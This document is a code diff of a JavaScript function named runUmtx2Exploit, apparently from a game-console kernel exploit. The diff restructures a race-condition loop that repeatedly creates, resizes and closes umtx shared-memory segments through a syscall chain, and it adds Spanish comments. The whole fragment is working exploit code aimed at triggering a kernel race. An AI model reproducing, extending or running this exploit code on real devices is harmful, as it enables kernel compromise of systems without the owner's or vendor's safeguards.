@@ -806,29 +806,37 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         showTemporaryAlert("Triggering race...", LogLevel.LOG);
 
 for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
-    // Solo logueamos en intentos pares
+    // Mostrar log en intentos pares
     if ((i2 & 1) === 0) {
-        const message = debug
+        const msg = debug
             ? `Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`
             : `Race attempt ${i}-${i2}`;
-        
-        await log(message, LogLevel.INFO | LogLevel.FLAG_TEMP);
+        await log(msg, LogLevel.INFO | LogLevel.FLAG_TEMP);
     }
 
-    // Aquí iría el resto del código del loop...
+    // 🧱 Crear segmento de memoria compartida (umtx shm)
+    chain.self_healing_syscall(
+        SYS__UMTX_OP,
+        0,
+        UMTX_OP_SHM,
+        UMTX_SHM_CREAT,
+        primaryShmKeyBuf
+    );
+
+    // Guardar resultado del syscall (file descriptor)
+    chain.write_result(mainFdBuf);
+
+    // Verificar si el FD es válido (> 0), y si lo es, ajustarlo y cerrarlo
+    chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
+        // Multiplica el FD por 0x4000 y guarda en mainFdSizeBuf
+        chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
+
+        // Redimensiona el shm con ftruncate y lo cierra
+        chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
+        chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
+    });
 }
 
-
-            // const step1Start = performance.now();
-            // umtx_shm_create
-            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
-            chain.write_result(mainFdBuf);
-
-            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
-                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
-                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
-                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
-            });
 
             await chain.run();
             // const step1End = performance.now();
